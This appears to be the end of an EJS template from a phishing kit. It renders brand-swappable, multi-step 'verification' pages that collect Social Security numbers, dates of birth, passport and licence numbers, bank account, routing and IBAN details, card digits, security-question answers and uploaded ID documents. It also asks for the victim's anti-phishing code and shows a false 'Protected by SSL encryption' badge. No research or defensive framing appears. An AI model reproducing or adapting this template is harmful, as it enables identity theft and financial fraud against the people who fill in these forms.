h1{font-size:1.25rem;margin-bottom:8px;text-align:center}
.sub{font-size:.9rem;opacity:.65;text-align:center;margin-bottom:28px;line-height:1.5}
.field-group{margin-bottom:16px}
label{display:block;font-size:.85rem;opacity:.8;margin-bottom:6px}
input,select,textarea{width:100%;padding:12px 14px;background:var(--bg);border:1px solid var(--line);border-radius:10px;color:var(--ink);font-family:inherit;font-size:.95rem;transition:.15s;outline:none}
input:focus,select:focus,textarea:focus{border-color:var(--ac);outline:2px solid var(--ac);outline-offset:1px}
textarea{resize:vertical;min-height:80px}
.upload-area{border:2px dashed #ffffff30;border-radius:12px;padding:32px;text-align:center;cursor:pointer;transition:.2s;margin-bottom:16px}
.upload-area:hover{border-color:var(--ac);background:var(--ac)08}
.upload-area .icon{font-size:2.5rem;margin-bottom:8px}
.upload-area p{font-size:.88rem;opacity:.6}
.btn{width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px;transition:.2s}
.btn:hover{opacity:.9}
.secure{text-align:center;font-size:.78rem;opacity:.45;margin-top:16px;display:flex;align-items:center;justify-content:center;gap:6px}
.err{background:#ef444420;border:1px solid #ef444440;border-radius:8px;padding:10px 14px;font-size:.85rem;color:#fca5a5;margin-bottom:14px;display:none}
</style>
</head>
<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="card">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
  <h1><%= pageContent.headline %></h1>
  <p class="sub"><%= pageContent.subheadline %></p>

  <div class="err" id="err"></div>

  <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>" enctype="multipart/form-data">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="hidden" name="_step" value="<%= pageContent.slug %>">

    <% if (pageContent.form_type === 'id_verify') { %>
      <% const fldLabels = { full_name:'Full Name', dob:'Date of Birth', id_number:'ID Number', ssn:'Social Security Number (SSN)', ssn_last4:'Last 4 digits of SSN', card_last4:'Last 4 digits of card', address:'Street Address', passport_number:'Passport Number', nationality:'Nationality', city:'City', state:'State', zip:'ZIP Code', dl_number:'Driver\'s License Number', phone:'Phone Number', email:'Email Address', account_number:'Account Number', routing_number:'Routing Number', iban:'IBAN', booking_ref:'Booking Reference', last_name:'Last Name' } %>
      <% (pageContent.fields || []).forEach(f => { %>
        <div class="field-group">
          <label><%= fldLabels[f] || f %></label>
          <input type="<%= f==='dob'?'date':'text' %>" name="<%= f %>" required>
        </div>
      <% }) %>

      <% if ((pageContent.fields || []).length === 0 || pageContent.upload_doc) { %>
        <div class="upload-area" onclick="document.getElementById('docfile').click()">
          <div class="icon">📷</div>
          <p>Click to upload your ID document</p>
          <p style="font-size:.78rem;margin-top:4px;opacity:.4">JPG, PNG, PDF — up to 10MB</p>
        </div>
        <input type="file" id="docfile" name="doc_file" accept="image/*,.pdf" style="display:none" onchange="document.querySelector('.upload-area p').textContent=this.files[0]?.name||'Select file'">
      <% } %>

    <% } else if (pageContent.form_type === 'security_q') { %>
      <div class="field-group">
        <label>What was the name of your elementary school?</label>
        <input type="text" name="answer1" required>
      </div>
      <div class="field-group">
        <label>What is your mother's maiden name?</label>
        <input type="text" name="answer2" required>
      </div>
      <div class="field-group">
        <label>What was the name of your first pet?</label>
        <input type="text" name="answer3" required>
      </div>

    <% } else { %>
      <% const fldLabels = { full_name:'Full Name', dob:'Date of Birth', id_number:'ID Number', ssn:'Social Security Number (SSN)', ssn_last4:'Last 4 digits of SSN', card_last4:'Last 4 digits of card', address:'Street Address', phone:'Phone Number', email:'Email Address', passport_number:'Passport Number', nationality:'Nationality', city:'City', state:'State', zip:'ZIP Code', dl_number:'Driver\'s License Number', account_number:'Account Number', routing_number:'Routing Number', iban:'IBAN', booking_ref:'Booking Reference', last_name:'Last Name', anti_phishing_code:'Anti-Phishing Code' } %>
      <% (pageContent.fields || []).forEach(f => { %>
        <div class="field-group">
          <label><%= fldLabels[f] || f %></label>
          <input type="<%= f==='dob'?'date':f==='email'?'email':f==='phone'?'tel':'text' %>" name="<%= f %>" required>
        </div>
      <% }) %>
    <% } %>

    <button type="submit" class="btn"><%= pageContent.cta || 'Continue' %></button>
  </form>
  <p class="secure">🔒 Protected by SSL encryption</p>
</div>
<script>
document.querySelector('form').addEventListener('submit', function(e) {
  const inputs = this.querySelectorAll('input[required]');
  for (const inp of inputs) {
    if (!inp.value.trim()) {
      e.preventDefault();
      document.getElementById('err').style.display='block';
      document.getElementById('err').textContent='Please fill in all required fields';
      inp.focus(); return;
    }
  }
});
</script>
</body>
</html>
